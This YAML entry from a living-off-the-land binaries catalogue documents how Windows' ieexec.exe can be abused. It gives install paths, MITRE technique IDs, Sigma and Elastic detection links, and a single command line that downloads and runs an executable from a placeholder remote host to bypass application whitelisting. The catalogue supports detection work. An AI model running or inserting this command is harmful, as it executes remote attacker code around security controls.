---
Name: Ieexec.exe
Description: The IEExec.exe application is an undocumented Microsoft .NET Framework application that is included with the .NET Framework. You can use the IEExec.exe application as a host to run other managed applications that you start by using a URL.
Author: 'Oddvar Moe'
Created: 2018-05-25
Commands:
  - Command: ieexec.exe http://x.x.x.x:8080/bypass.exe
    Description: Downloads and executes bypass.exe from the remote server.
    Usecase: Download and run attacker code from remote location
    Category: Download
    Privileges: User
    MitreID: T1105
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: ieexec.exe http://x.x.x.x:8080/bypass.exe
    Description: Downloads and executes bypass.exe from the remote server.
    Usecase: Download and run attacker code from remote location
    Category: Execute
    Privileges: User
    MitreID: T1218
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
Full_Path:
  - Path: C:\Windows\Microsoft.NET\Framework\v2.0.50727\ieexec.exe
  - Path: C:\Windows\Microsoft.NET\Framework64\v2.0.50727\ieexec.exe
Code_Sample:
  - Code:
Detection:
  - Sigma: https://github.com/SigmaHQ/sigma/blob/a04fbe2a99f1dcbbfeb0ee4957ae4b06b0866254/rules/windows/process_creation/win_possible_applocker_bypass.yml
  - Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_process_network_connection.toml
  - Elastic: https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/defense_evasion_misc_lolbin_connecting_to_the_internet.toml
  - Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml
  - IOC: Network connections originating from ieexec.exe may be suspicious
Resources:
  - Link: https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/
Acknowledgement:
  - Person: Casey Smith
    Handle: '@subtee'
---
